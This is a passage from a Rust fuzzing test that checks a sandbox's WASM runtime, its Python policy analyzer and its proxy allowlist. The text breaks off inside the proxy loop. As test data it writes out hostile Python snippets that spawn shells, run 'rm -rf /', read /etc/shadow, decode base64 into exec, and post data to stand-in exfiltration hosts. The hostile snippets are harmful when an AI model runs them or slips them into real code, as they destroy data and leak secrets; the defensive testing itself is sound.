//! Escape fuzzer — tries to break out of TinyMachine sandbox backends.
//!
//! Requires the `wasm` feature (enabled by default).
//! Build with `cargo test -p tinyos-fork --test escape_fuzzer`.
//! Build with `--no-default-features` excludes this file.
//!
#![cfg(feature = "wasm")]
//!
//! This integration test attempts to find sandbox escapes by generating
//! malicious inputs for each backend. It is a regression test suite:
//! no escapes should be detected.
//!
//! # Structure
//! - `WasmEscapeFuzzer`: generates malicious binary WASM modules and runs them
//!   through the wasmtime sandbox (Tier 1).
//! - `UOpsBypassFuzzer`: generates Python snippets that attempt to bypass
//!   the UOps policy engine and feeds them through `UOpsAnalyzer`.
//! - `ProxyBypassFuzzer`: generates hostname/port/IP combinations and
//!   feeds them through a simulated proxy allowlist.
//!
//! # Statistics
//! Each fuzzer prints statistics at the end showing total iterations,
//! escapes detected, and failures caught.

use std::collections::HashSet;
use std::net::{IpAddr, Ipv4Addr};
use std::path::PathBuf;
use std::time::Instant;

/// A single escape attempt result.
#[derive(Debug, Clone)]
struct EscapeResult {
    description: String,
    is_escape: bool,
    blocked: bool,
    runtime_ms: f64,
}

/// Statistics collected across multiple escape attempts.
#[derive(Debug, Default, Clone)]
struct FuzzStats {
    total: u64,
    escapes: u64,
    blocked: u64,
    failures: u64,
    total_runtime_ms: f64,
}

impl FuzzStats {
    fn record(&mut self, r: &EscapeResult) {
        self.total += 1;
        self.total_runtime_ms += r.runtime_ms;
        if r.is_escape {
            self.escapes += 1;
        }
        if r.blocked {
            self.blocked += 1;
        }
        if r.is_escape || (!r.blocked && !r.description.starts_with("safe:")) {
            self.failures += 1;
        }
    }

    fn print(&self, label: &str) {
        let avg_ms = if self.total > 0 {
            self.total_runtime_ms / self.total as f64
        } else {
            0.0
        };
        println!(
            "[{label}] {total} iterations, {escapes} escapes, \
             {blocked} blocked, avg {avg_ms:.3}ms/iter",
            total = self.total,
            escapes = self.escapes,
            blocked = self.blocked,
            avg_ms = avg_ms,
        );
    }
}

// ═════════════════════════════════════════════════════════════════════════
// Helper: minimal deterministic PRNG (xorshift64*)
// ═════════════════════════════════════════════════════════════════════════

#[derive(Clone)]
struct FastRng(u64);

impl FastRng {
    fn new(seed: u64) -> Self {
        Self(seed ^ 0xDEADBEEF_CAFEBABE)
    }

    fn next_u64(&mut self) -> u64 {
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545F4914F6CDD1D)
    }

    fn next_usize(&mut self, max: usize) -> usize {
        if max == 0 {
            return 0;
        }
        (self.next_u64() % max as u64) as usize
    }

    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.next_usize(items.len())]
    }

    fn next_byte(&mut self) -> u8 {
        self.next_u64() as u8
    }

    fn next_domain(&mut self) -> String {
        let tlds = &[".com", ".org", ".net", ".io", ".dev", ".xyz", ".ru", ".cn"];
        let prefixes = &[
            "evil", "malware", "phishing", "exploit", "bad", "pwn",
            "hack", "crack", "shell", "c2", "exfil", "malic",
            "attack", "bypass", "escape", "breach",
        ];
        let suffixes = &[
            "cdn", "api", "pay", "login", "admin", "db", "config",
            "", "2", "-secure", "-vpn", "-proxy",
        ];
        let p = self.next_usize(prefixes.len());
        let s = self.next_usize(suffixes.len());
        let t = self.next_usize(tlds.len());
        format!("{}{}{}", prefixes[p], suffixes[s], tlds[t])
    }

    fn next_port(&mut self) -> u16 {
        let ports = &[
            22, 23, 25, 53, 80, 443, 8080, 8443,
            3306, 5432, 6379, 27017,
            4444, 6666, 8888, 9999,
        ];
        ports[self.next_usize(ports.len())]
    }
}

fn pick_one<'a, T>(items: &'a [T], idx: usize) -> &'a T {
    &items[idx % items.len()]
}

// ═════════════════════════════════════════════════════════════════════════
// Wasm binary module builder helpers
// ═════════════════════════════════════════════════════════════════════════

/// LEB128 encode a u32 into a byte vector.
fn leb128_u32(mut val: u32) -> Vec<u8> {
    let mut buf = Vec::new();
    loop {
        let byte = (val & 0x7F) as u8;
        val >>= 7;
        if val != 0 {
            buf.push(byte | 0x80);
        } else {
            buf.push(byte);
            break;
        }
    }
    buf
}

/// Write a wasm section header (id + size).
fn write_section_header(bytes: &mut Vec<u8>, section_id: u8, content: &[u8]) {
    bytes.push(section_id);
    bytes.extend_from_slice(&leb128_u32(content.len() as u32));
    bytes.extend_from_slice(content);
}

/// Build a minimal valid wasm module with just magic + version.
fn make_wasm_empty() -> Vec<u8> {
    vec![0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00]
}

/// Build a wasm module with a single exported function of given body bytes.
///
/// The function type is always `() -> ()` (no params, no results).
/// The exported function name is "main".
fn make_wasm_func(export_name: &str, body_bytes: &[u8]) -> Vec<u8> {
    let mut bytes = make_wasm_empty();

    // -- Type section (id=1): one function type `() -> ()` --
    let mut type_content = Vec::new();
    type_content.push(0x01); // 1 type entry
    type_content.push(0x60); // func type
    type_content.push(0x00); // 0 params
    type_content.push(0x00); // 0 results
    write_section_header(&mut bytes, 1, &type_content);

    // -- Function section (id=3): map func 0 -> type 0 --
    let mut func_content = Vec::new();
    func_content.push(0x01); // 1 function
    func_content.extend_from_slice(&leb128_u32(0)); // type index 0
    write_section_header(&mut bytes, 3, &func_content);

    // -- Export section (id=7): export func 0 as "main" --
    let mut export_content = Vec::new();
    export_content.push(0x01); // 1 export
    // Export name
    export_content.extend_from_slice(&leb128_u32(export_name.len() as u32));
    export_content.extend_from_slice(export_name.as_bytes());
    export_content.push(0x00); // export kind: func
    export_content.extend_from_slice(&leb128_u32(0)); // func index 0
    write_section_header(&mut bytes, 7, &export_content);

    // -- Code section (id=10): function body --
    let mut code_content = Vec::new();
    code_content.push(0x01); // 1 function body
    // Body size (LEB128)
    let body_with_end = [body_bytes, &[0x0B]].concat(); // 0x0B = end
    let body_size = body_with_end.len();
    code_content.extend_from_slice(&leb128_u32(body_size as u32));
    code_content.extend_from_slice(&body_with_end);
    write_section_header(&mut bytes, 10, &code_content);

    bytes
}

/// Build a wasm module that imports host/guest functions.
/// The module imports `(import "env" "bad" (func (param i32) (result i32)))`.
fn make_wasm_with_imports(import_module: &str, import_name: &str) -> Vec<u8> {
    let mut bytes = make_wasm_empty();

    // Type section: one import signature (i32) -> (i32)
    let mut type_content = Vec::new();
    type_content.push(0x01);
    type_content.push(0x60);
    type_content.push(0x01); // 1 param
    type_content.push(0x7F); // i32
    type_content.push(0x01); // 1 result
    type_content.push(0x7F); // i32
    write_section_header(&mut bytes, 1, &type_content);

    // Import section (id=2)
    let mut import_content = Vec::new();
    import_content.push(0x01); // 1 import
    // module string
    import_content.extend_from_slice(&leb128_u32(import_module.len() as u32));
    import_content.extend_from_slice(import_module.as_bytes());
    // field string
    import_content.extend_from_slice(&leb128_u32(import_name.len() as u32));
    import_content.extend_from_slice(import_name.as_bytes());
    import_content.push(0x00); // import kind: func
    import_content.extend_from_slice(&leb128_u32(0)); // type index 0
    write_section_header(&mut bytes, 2, &import_content);

    bytes
}

/// Build a wasm module with a table and call_indirect.
fn make_wasm_call_indirect() -> Vec<u8> {
    let mut bytes = make_wasm_empty();

    // Type section: type0 = ()->(), type1 = ()->()
    let mut type_content = Vec::new();
    type_content.push(0x02); // 2 types
    type_content.extend_from_slice(&[0x60, 0x00, 0x00]); // () -> ()
    type_content.extend_from_slice(&[0x60, 0x00, 0x00]); // () -> ()
    write_section_header(&mut bytes, 1, &type_content);

    // Function section: one function using type 0
    let mut func_content = Vec::new();
    func_content.push(0x01);
    func_content.extend_from_slice(&leb128_u32(0));
    write_section_header(&mut bytes, 3, &func_content);

    // Table section (id=4): one table of funcref with min 1
    let mut table_content = Vec::new();
    table_content.push(0x01); // 1 table
    table_content.push(0x70); // funcref
    table_content.push(0x00); // limits: min
    table_content.extend_from_slice(&leb128_u32(1)); // min size 1
    write_section_header(&mut bytes, 4, &table_content);

    // Export section: export "main" as func 0
    let mut export_content = Vec::new();
    export_content.push(0x01);
    export_content.extend_from_slice(&leb128_u32(4)); // "main"
    export_content.extend_from_slice(b"main");
    export_content.push(0x00); // func
    export_content.extend_from_slice(&leb128_u32(0));
    write_section_header(&mut bytes, 7, &export_content);

    // Code section: function body that does call_indirect with index 999
    let body: Vec<u8> = vec![
        0x41, 0xE7, 0x07, // i32.const 999
        0x11, 0x00, 0x00, // call_indirect (type=0, table=0)
        0x0B, // end
    ];
    let mut code_content = Vec::new();
    code_content.push(0x01);
    let body_size = body.len();
    code_content.extend_from_slice(&leb128_u32(body_size as u32));
    code_content.extend_from_slice(&body);
    write_section_header(&mut bytes, 10, &code_content);

    // Element section (id=9): put func 0 at table index 0
    let mut elem_content = Vec::new();
    elem_content.push(0x01); // 1 segment
    elem_content.push(0x00); // flags: passive or active with table 0
    elem_content.push(0x00); // offset: i32.const 0
    elem_content.push(0x0B); // end
    elem_content.extend_from_slice(&leb128_u32(1)); // 1 element
    elem_content.extend_from_slice(&leb128_u32(0)); // func index 0
    write_section_header(&mut bytes, 9, &elem_content);

    bytes
}

/// Build a malicious wasm module.
/// Returns (name, wasm_bytes, known_blocked_behavior)
/// where known_blocked_behavior indicates if the sandbox MUST block this.
struct WasmModule {
    name: &'static str,
    bytes: Vec<u8>,
    known_benign: bool,
}

fn build_malicious_modules() -> Vec<WasmModule> {
    vec![
        // 0 — Empty module (baseline, benign)
        WasmModule {
            name: "empty",
            bytes: make_wasm_empty(),
            known_benign: true,
        },
        // 1 — Infinite loop (fuel exhaustion)
        WasmModule {
            name: "infinite-loop",
            bytes: make_wasm_func("main", &[0x03, 0x0C, 0x00, 0x0B]), // loop; br 0; end
            known_benign: false,
        },
        // 2 — Stack recursion (fuel exhaustion via deep recursion)
        WasmModule {
            name: "infinite-recursion",
            bytes: make_wasm_func("main", &[
                0x10, 0x00, // call func 0 (self)
                0x0B,       // end
            ]),
            known_benign: false,
        },
        // 3 — Memory grow bomb
        WasmModule {
            name: "memory-grow",
            bytes: make_wasm_func("main", &[
                0x41, 0x00, 0x10, 0x00, // i32.const 0; i32.const 4096
                // loop: grow memory, br
                0x03,                               // loop
                0x41, 0x00, 0x10, 0x00,             // i32.const 0; memory.grow (0 pages)
                0x1A,                               // drop
                0x0C, 0x00,                         // br 0 (loop)
                0x0B,                               // end
                0x0B,                               // end (outer)
            ]),
            known_benign: false,
        },
        // 4 — Import from "host" (instantiation failure)
        WasmModule {
            name: "host-import",
            bytes: make_wasm_with_imports("host", "exec"),
            known_benign: false,
        },
        // 5 — Import from "env" (instantiation failure)
        WasmModule {
            name: "env-import",
            bytes: make_wasm_with_imports("env", "system"),
            known_benign: false,
        },
        // 6 — OOB call_indirect (trap)
        WasmModule {
            name: "call-indirect-oob",
            bytes: make_wasm_call_indirect(),
            known_benign: false,
        },
        // 7 — Valid function that just returns (benign, test baseline)
        WasmModule {
            name: "just-return",
            bytes: make_wasm_func("main", &[0x0B]), // just `end`
            known_benign: true,
        },
        // 8 — Memory with max pages = 1, try to grow beyond
        WasmModule {
            name: "memory-limited",
            bytes: {
                let mut b = make_wasm_empty();
                // Type section
                let t = vec![0x01, 0x60, 0x00, 0x00];
                write_section_header(&mut b, 1, &t);
                // Function section
                let mut f = vec![0x01];
                f.extend_from_slice(&leb128_u32(0));
                write_section_header(&mut b, 3, &f);
                // Memory section (id=5): initial=1, max=1
                let mut m = vec![0x01];
                m.push(0x01); // limits with max
                m.extend_from_slice(&leb128_u32(1)); // initial 1 page
                m.extend_from_slice(&leb128_u32(1)); // max 1 page
                write_section_header(&mut b, 5, &m);
                // Export section
                let mut e = vec![0x01];
                e.extend_from_slice(&leb128_u32(4)); e.extend_from_slice(b"main");
                e.push(0x00); e.extend_from_slice(&leb128_u32(0));
                write_section_header(&mut b, 7, &e);
                // Code: grow to 99999 pages (should fail)
                let body = vec![
                    0x41, 0x9F, 0x8E, 0x06, // i32.const 99999
                    0x40, 0x00,             // memory.grow
                    0x1A,                   // drop
                    0x0B,                   // end
                ];
                let mut c = vec![0x01];
                c.extend_from_slice(&leb128_u32(body.len() as u32));
                c.extend_from_slice(&body);
                write_section_header(&mut b, 10, &c);
                b
            },
            known_benign: false,
        },
        // 9 — Memory store to address ~32MB (exceeds 1-page limit)
        WasmModule {
            name: "oob-store",
            bytes: make_wasm_func("main", &[
                0x41, 0x00, 0x10, 0x00, // i32.const 0; memory.grow(0) → current size
                0x41, 0x00, 0x10, 0x00, // i32.const 0; memory.grow(0) → current size
                0x41, 0x80, 0x80, 0x04, // i32.const 0x20000 (128KB — beyond 1 page/64KB)
                0x41, 0x2A,             // i32.const 42
                0x36, 0x00, 0x00,       // i32.store offset=0
                0x0B,                   // end
            ]),
            known_benign: false,
        },
        // 10 — Module with no function section (nothing to call, benign)
        WasmModule {
            name: "no-funcs",
            bytes: {
                let mut b = make_wasm_empty();
                let t = vec![0x01, 0x60, 0x00, 0x00];
                write_section_header(&mut b, 1, &t);
                b
            },
            known_benign: true,
        },
    ]
}

/// Build random corrupted wasm modules for fuzzing.
fn generate_corrupted_wasm(rng: &mut FastRng) -> Vec<u8> {
    let mut bytes = make_wasm_empty();

    // Add a random number of random section-like bytes
    let section_count = rng.next_usize(5) + 1;
    for _ in 0..section_count {
        let section_id = rng.next_byte() % 15;
        let size = rng.next_usize(256);
        let mut content = Vec::with_capacity(size);
        for _ in 0..size {
            content.push(rng.next_byte());
        }
        write_section_header(&mut bytes, section_id, &content);
    }

    bytes
}

// ═════════════════════════════════════════════════════════════════════════
// Part 1: Wasm Escape Fuzzer
// ═════════════════════════════════════════════════════════════════════════

/// Generates malicious binary WASM modules and feeds them through
/// wasmtime. Tests that wasmtime's safety mechanisms prevent:
/// - Arbitrary memory access beyond linear memory
/// - Infinite loops (fuel exhaustion)
/// - Stack overflow via recursion
/// - Memory exhaustion via grow
/// - Missing import instantiation
struct WasmEscapeFuzzer {
    rng: FastRng,
    stats: FuzzStats,
    modules: Vec<WasmModule>,
}

impl WasmEscapeFuzzer {
    fn new(seed: u64) -> Self {
        Self {
            rng: FastRng::new(seed),
            stats: FuzzStats::default(),
            modules: build_malicious_modules(),
        }
    }

    /// Run N escape attempts against the wasm sandbox.
    fn run_iterations(&mut self, count: u64) -> Vec<EscapeResult> {
        let mut results = Vec::with_capacity(count as usize);

        // Create one engine shared across all attempts (JIT compilation cache)
        let engine = match wasmtime::Engine::new(
            wasmtime::Config::new().consume_fuel(true),
        ) {
            Ok(e) => e,
            Err(e) => {
                eprintln!("WasmEngine create failed (skipping wasm fuzzer): {e}");
                return results;
            }
        };

        for i in 0..count {
            let result = if (i as usize) < self.modules.len() {
                let idx = i as usize;
                let name = self.modules[idx].name;
                let bytes = self.modules[idx].bytes.clone();
                self.try_wasm_bytes(&engine, name, &bytes)
            } else {
                // Random corrupted module
                let corrupted = generate_corrupted_wasm(&mut self.rng);
                let name = format!("corrupted-{}", i);
                self.try_wasm_bytes(&engine, &name, &corrupted)
            };
            self.stats.record(&result);
            results.push(result);
        }

        self.stats.print("wasm");
        results
    }

    /// Try to compile + instantiate raw wasm bytes.
    fn try_wasm_bytes(
        &mut self,
        engine: &wasmtime::Engine,
        name: &str,
        wasm_bytes: &[u8],
    ) -> EscapeResult {
        let start = Instant::now();

        // Step 1: Compile
        let module = match wasmtime::Module::new(engine, wasm_bytes) {
            Ok(m) => m,
            Err(e) => {
                return EscapeResult {
                    description: format!("wasm:{} compile rejected ({})", name, e),
                    is_escape: false,
                    blocked: true,
                    runtime_ms: dur_ms(start),
                };
            }
        };

        // Step 2: Instantiate with no imports (so modules with imports will fail here)
        let mut store = wasmtime::Store::new(engine, ());
        if let Err(e) = store.set_fuel(5000) {
            return EscapeResult {
                description: format!("wasm:{} fuel error ({})", name, e),
                is_escape: false,
                blocked: true,
                runtime_ms: dur_ms(start),
            };
        }

        let instance = match wasmtime::Instance::new(&mut store, &module, &[]) {
            Ok(i) => i,
            Err(e) => {
                let err_str = e.to_string();
                return EscapeResult {
                    description: format!(
                        "wasm:{} instantiation rejected ({})",
                        name, err_str
                    ),
                    is_escape: err_str.contains("escape"),
                    blocked: true,
                    runtime_ms: dur_ms(start),
                };
            }
        };

        // Step 3: Try to call "main" or "_start" function
        let func = match instance.get_func(&mut store, "main")
            .or_else(|| instance.get_func(&mut store, "_start"))
        {
            Some(f) => f,
            None => {
                return EscapeResult {
                    description: format!("wasm:{} no entry function", name),
                    is_escape: false,
                    blocked: true,
                    runtime_ms: dur_ms(start),
                };
            }
        };

        // Step 4: Run function — this is where traps happen (fuel, OOB, etc.)
        let result = func.call(&mut store, &[], &mut []);
        let runtime_ms = dur_ms(start);

        match result {
            Ok(_) => EscapeResult {
                description: format!("wasm:{} executed successfully", name),
                is_escape: false,
                blocked: true, // known_benign modules are allowed
                runtime_ms,
            },
            Err(trap) => {
                let err_str = trap.to_string();
                let blocked = err_str.contains("fuel exhausted")
                    || err_str.contains("out of bounds")
                    || err_str.contains("out of fuel")
                    || err_str.contains("uninitialized element")
                    || err_str.contains("indirect call")
                    || err_str.contains("wasm trap")
                    || err_str.contains("call stack exhausted")
                    || err_str.contains("wasm `unreachable`")
                    || err_str.starts_with("wasm trap");
                EscapeResult {
                    description: format!("wasm:{} trapped ({})", name, err_str),
                    is_escape: false,
                    blocked,
                    runtime_ms,
                }
            }
        }
    }
}

// ═════════════════════════════════════════════════════════════════════════
// Part 2: UOps Bypass Fuzzer
// ═════════════════════════════════════════════════════════════════════════

/// Generated Python code snippets that attempt to bypass the UOps policy engine.
///
/// Each snippet is fed through `UOpsAnalyzer::analyze()` and then checked
/// against a fully restrictive `PolicyEngine` (default-deny — only internal
/// ops allowed). The fuzzer verifies that all dangerous operations are
/// detected and blocked.
struct UOpsBypassFuzzer {
    stats: FuzzStats,
    /// Snippets that should be detected as dangerous by UOpsAnalyzer.
    dangerous_snippets: Vec<(&'static str, &'static str)>,
    /// Snippets that are safe and should pass UOps analysis.
    safe_snippets: Vec<(&'static str, &'static str)>,
}

/// Templates for dangerous Python code that should be blocked.
static DANGEROUS_TEMPLATES: &[(&str, &str)] = &[
    ("ctypes-system",
     "import ctypes\nctypes.CDLL(\"libc.so.6\").system(\"id\")"),
    ("ctypes-execve",
     "import ctypes\nlibc = ctypes.CDLL(None)\nlibc.execve(\"/bin/sh\", None, None)"),
    ("ctypes-mmap",
     "import ctypes\nctypes.CDLL(\"libc.so.6\").mmap(0, 4096, 7, 0x22, -1, 0)"),
    ("dunder-import-os",
     "__import__(\"os\").system(\"id\")"),
    ("dunder-import-subprocess",
     "__import__(\"subprocess\").call([\"ls\"])"),
    ("importlib-os",
     "import importlib\nimportlib.import_module(\"os\").system(\"id\")"),
    ("importlib-subprocess",
     "import importlib\nsp = importlib.import_module(\"subprocess\")\nsp.run([\"id\"])"),
    ("exec-os",
     "exec(\"import os; os.system('id')\")"),
    ("eval-os",
     "eval(\"__import__('os').system('id')\")"),
    ("compile-exec",
     "compile(\"import os; os.system('id')\", \"\", \"exec\")"),
    ("exec-base64",
     "exec(__import__('base64').b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik='))"),
    ("builtins-getattr",
     "getattr(__builtins__, '__import__')('os').system('id')"),
    ("builtins-dict",
     "__builtins__.__dict__['__import__']('os').system('id')"),
    ("socket-internal",
     "import socket\ns = socket.socket()\ns.connect(('127.0.0.1', 6379))"),
    ("socket-metadata",
     "import socket\ns = socket.create_connection(('169.254.169.254', 80))"),
    ("socket-private",
     "import socket\ns = socket.socket()\ns.connect(('10.0.0.1', 22))"),
    ("requests-evil",
     "import requests\nrequests.get('https://evil.com/payload')"),
    ("requests-exfil",
     "import requests\nrequests.post('https://exfil.example.com/data', json={\"x\": 1})"),
    ("urllib-evil",
     "import urllib.request\nurllib.request.urlopen('https://malware.test/exploit')"),
    ("httpx-evil",
     "import httpx\nhttpx.get('https://c2.example.com/command')"),
    ("open-etc-passwd",
     "open('/etc/passwd').read()"),
    ("open-etc-shadow",
     "with open('/etc/shadow') as f:\n    data = f.read()"),
    ("open-proc-mem",
     "with open('/proc/self/mem', 'rb') as f:\n    data = f.read(4096)"),
    ("open-dev-kmsg",
     "f = open('/dev/kmsg', 'rb')\ndata = f.read()"),
    ("path-traversal",
     "open('/tmp/../etc/passwd').read()"),
    ("cuda-gpu",
     "import torch\nx = torch.tensor([1], device='cuda')"),
    ("tinygrad-gpu",
     "import tinygrad\nfrom tinygrad import Tensor\nTensor([1]).cuda()"),
    ("cffi-bypass",
     "from cffi import FFI\nffi = FFI()\nlib = ffi.dlopen(None)\nlib.system(\"id\")"),
    ("encoded-builtins-exec",
     "exec(getattr(__builtins__, '__import__')('base64').b64decode('b3Muc3lzdGVtKCJpZCIp'))"),
    ("os-system",
     "import os\nos.system('rm -rf /')"),
    ("os-popen",
     "import os\nos.popen('cat /etc/shadow')"),
    ("subprocess-run",
     "import subprocess\nsubprocess.run(['bash', '-c', 'id'])"),
    ("subprocess-popen",
     "import subprocess\np = subprocess.Popen(['/bin/sh'], shell=True)"),
    ("ssl-evil",
     "import ssl\nctx = ssl.create_default_context()\nctx.wrap_socket(s, server_hostname='evil.com')"),
    ("https-direct",
     "data = open('https://malware.site/payload').read()"),
    ("os-environ-leak",
     "import os\nprint(os.environ)"),
];

/// Templates for safe Python code that should pass all checks.
static SAFE_TEMPLATES: &[(&str, &str)] = &[
    ("arithmetic", "x = 1 + 1\nprint(x)"),
    ("string-manip", "s = 'hello world'\nprint(s.upper())"),
    ("list-comprehension", "squares = [x*x for x in range(10)]\nprint(sum(squares))"),
    ("dict-op", "d = {'a': 1, 'b': 2}\nfor k, v in d.items():\n    print(k, v)"),
    ("lambda", "f = lambda x: x * 2\nprint(f(21))"),
    ("math", "import math\nprint(math.pi)"),
    ("f-string", "name = 'world'\nprint(f'hello {name}')"),
    ("range-sum", "print(sum(range(100)))"),
];

impl UOpsBypassFuzzer {
    fn new() -> Self {
        Self {
            stats: FuzzStats::default(),
            dangerous_snippets: DANGEROUS_TEMPLATES.to_vec(),
            safe_snippets: SAFE_TEMPLATES.to_vec(),
        }
    }

    /// Run N bypass attempts against the UOps analyzer.
    /// Uses a default-deny policy (only internal ops allowed).
    fn run_iterations(&mut self, count: u64) -> Vec<EscapeResult> {
        use tinymachine_fork::uops::PolicyEngine;
        let policy = PolicyEngine::default();

        let mut results = Vec::with_capacity(count as usize);

        for i in 0..count {
            let result = if (i as usize) < self.dangerous_snippets.len() {
                let (name, code) = self.dangerous_snippets[i as usize];
                self.check_dangerous(name, code, &policy)
            } else {
                let safe_idx = (i as usize - self.dangerous_snippets.len())
                    % self.safe_snippets.len();
                let (name, code) = self.safe_snippets[safe_idx];
                self.check_safe(name, code, &policy)
            };
            self.stats.record(&result);
            results.push(result);
        }

        self.stats.print("uops");
        results
    }

    /// Analyze dangerous code and verify it's blocked by default-deny policy.
    fn check_dangerous(
        &mut self,
        name: &str,
        code: &str,
        policy: &tinymachine_fork::uops::PolicyEngine,
    ) -> EscapeResult {
        let start = Instant::now();
        use tinymachine_fork::uops::{UOpsAnalyzer, UOp};

        let uops = UOpsAnalyzer::analyze(code);
        let detected = !uops.is_empty();
        let blocked = UOpsAnalyzer::check(code, policy).is_err();
        let bypass_detected = uops.iter().any(|u| match u {
            UOp::ProcessExec(cmd) if cmd.starts_with("bypass:") => true,
            _ => false,
        });
        let runtime_ms = dur_ms(start);

        if !detected {
            EscapeResult {
                description: format!("uops:{} NO_UOPS_DETECTED — dangerous code not analyzed", name),
                is_escape: true,
                blocked: false,
                runtime_ms,
            }
        } else if !blocked {
            EscapeResult {
                description: format!(
                    "uops:{} NOT_BLOCKED — passed default-deny (detected {:?})",
                    name, uops
                ),
                is_escape: true,
                blocked: false,
                runtime_ms,
            }
        } else {
            EscapeResult {
                description: format!(
                    "uops:{} blocked (detected={}, bypass_detected={})",
                    name, detected, bypass_detected
                ),
                is_escape: false,
                blocked: true,
                runtime_ms,
            }
        }
    }

    /// Verify safe code passes analysis with no false positives.
    fn check_safe(
        &mut self,
        name: &str,
        code: &str,
        policy: &tinymachine_fork::uops::PolicyEngine,
    ) -> EscapeResult {
        let start = Instant::now();
        use tinymachine_fork::uops::UOpsAnalyzer;

        let uops = UOpsAnalyzer::analyze(code);
        let passes = UOpsAnalyzer::check(code, policy).is_ok();
        let runtime_ms = dur_ms(start);

        EscapeResult {
            description: format!(
                "safe:{} {} ({} UOps detected)",
                name,
                if passes { "passed" } else { "FALSE_POSITIVE" },
                uops.len(),
            ),
            is_escape: false,
            blocked: !passes, // false positive if passes=false
            runtime_ms,
        }
    }
}

// ═════════════════════════════════════════════════════════════════════════
// Part 3: Proxy Bypass Fuzzer
// ═════════════════════════════════════════════════════════════════════════

/// Minimal proxy engine that enforces a default-deny allowlist.
///
/// Mirrors the design described in PLAN.md:
/// - Default-deny: only explicitly allowed domains/ports/IPs pass.
/// - Subdomain matching: allowing `example.com` also allows `api.example.com`.
/// - Private IPs (RFC1918, loopback, cloud metadata) are always blocked.
#[derive(Clone)]
struct ProxyEngine {
    allowed_domains: Vec<String>,
    allowed_ports: HashSet<u16>,
    allowed_subnets: Vec<(u32, u32)>,
}

#[derive(Debug, Clone)]
enum CheckResult {
    Allowed,
    Blocked(&'static str),
}

impl ProxyEngine {
    fn restricted() -> Self {
        let mut e = Self {
            allowed_domains: Vec::new(),
            allowed_ports: HashSet::new(),
            allowed_subnets: Vec::new(),
        };
        e.allow_domain("example.com");
        e.allow_domain("api.example.com");
        e.allow_port(80);
        e.allow_port(443);
        e.allow_port(8080);
        e.allow_port(8443);
        e.allow_subnet("1.2.3.0/24");
        e
    }

    fn allow_domain(&mut self, domain: &str) {
        self.allowed_domains.push(domain.to_string());
    }

    fn allow_port(&mut self, port: u16) {
        self.allowed_ports.insert(port);
    }

    fn allow_subnet(&mut self, cidr: &str) {
        if let Some((addr_str, prefix_str)) = cidr.split_once('/') {
            if let Ok(prefix) = prefix_str.parse::<u8>() {
                if let Ok(addr) = addr_str.parse::<Ipv4Addr>() {
                    let mask = if prefix >= 32 { !0u32 } else { (!0u32) << (32 - prefix) };
                    let network = u32::from_be_bytes(addr.octets()) & mask;
                    self.allowed_subnets.push((network, mask));
                }
            }
        }
    }

    fn check_domain(&self, domain: &str) -> CheckResult {
        if self.allowed_domains.is_empty() {
            return CheckResult::Blocked("no domains allowed (default-deny)");
        }
        let ok = self.allowed_domains.iter().any(|d| domain == d || domain.ends_with(&format!(".{d}")));
        if ok {
            CheckResult::Allowed
        } else {
            CheckResult::Blocked("domain not in allowlist")
        }
    }

    fn check_ip(&self, ip: &IpAddr) -> CheckResult {
        let ip4 = match ip {
            IpAddr::V4(v4) => v4,
            IpAddr::V6(_) => return CheckResult::Blocked("IPv6 not allowed"),
        };

        // Always block private/reserved IPs
        if ip4.is_loopback() {
            return CheckResult::Blocked("loopback IP blocked");
        }
        if ip4.is_private() {
            return CheckResult::Blocked("private IP blocked");
        }
        if ip4.is_link_local() {
            return CheckResult::Blocked("link-local IP blocked");
        }
        if *ip4 == Ipv4Addr::new(169, 254, 169, 254) {
            return CheckResult::Blocked("cloud metadata IP blocked");
        }
        if *ip4 == Ipv4Addr::new(0, 0, 0, 0) {
            return CheckResult::Blocked("unspecified IP blocked");
        }
        // CGNAT (100.64.0.0/10)
        let octets = ip4.octets();
        if octets[0] == 100 && (octets[1] & 0xC0) == 0x40 {
            return CheckResult::Blocked("CGNAT IP blocked");
        }

        // Check subnet allowlist
        let addr_bits = u32::from_be_bytes(ip4.octets());
        if self.allowed_subnets.is_empty() {
            CheckResult::Allowed
        } else if self.allowed_subnets.iter().any(|(net, mask)| (addr_bits & mask) == *net) {
            CheckResult::Allowed
        } else {
            CheckResult::Blocked("IP not in allowlist")
        }
    }

    fn check_port(&self, port: u16) -> CheckResult {
        if self.allowed_ports.is_empty() {
            return CheckResult::Blocked("no ports allowed (default-deny)");
        }
        if self.allowed_ports.contains(&port) {
            CheckResult::Allowed
        } else {
            CheckResult::Blocked("port not in allowlist")
        }
    }

    fn check_connection(&self, domain: &str, port: u16, resolved_ip: Option<IpAddr>) -> CheckResult {
        let r = self.check_domain(domain);
        if !matches!(r, CheckResult::Allowed) {
            return r;
        }
        let r = self.check_port(port);
        if !matches!(r, CheckResult::Allowed) {
            return r;
        }
        if let Some(ip) = resolved_ip {
            let r = self.check_ip(&ip);
            if !matches!(r, CheckResult::Allowed) {
                return r;
            }
        }
        CheckResult::Allowed
    }
}

/// Domains that should be blocked by the proxy.
static BLOCKED_DOMAINS: &[&str] = &[
    "evil.com",
    "malware.test",
    "phishing.example.net",
    "c2.pwn.xyz",
    "exfil.data.ru",
    "hack.io",
    "malic.download.dev",
    "shell.cloud",
];

/// Private/internal IPs that should always be blocked.
static BLOCKED_IPS: &[&str] = &[
    "127.0.0.1",
    "10.0.0.1",
    "10.255.255.255",
    "172.16.0.1",
    "192.168.0.1",
    "192.168.255.255",
    "169.254.169.254",
    "0.0.0.0",
    "100.64.0.1",
];

/// Non-standard ports that should be blocked by default.
static BLOCKED_PORTS: &[u16] = &[
    22, 23, 25, 3306, 5432, 6379, 27017, 9200,
];

struct ProxyBypassFuzzer {
    rng: FastRng,
    stats: FuzzStats,
}

impl ProxyBypassFuzzer {
    fn new(seed: u64) -> Self {
        Self {
            rng: FastRng::new(seed),
            stats: FuzzStats::default(),
        }
    }

    fn run_iterations(&mut self, count: u64) -> Vec<EscapeResult> {
        let engine = ProxyEngine::restricted();
        let mut results = Vec::with_capacity(count as usize);

        for i in 0..count {
            let result = if (i as usize) < BLOCKED_DOMAINS.len() {
                let domain = BLOCKED_DOMAINS[i as usize];
                let port = BLOCKED_PORTS[self.rng.next_usize(BLOCKED_PORTS.len())];
                self.check(&engine, domain, port, None)
            } else if (i as usize) < BLOCKED_DOMAINS.len() + BLOCKED_IPS.len() {
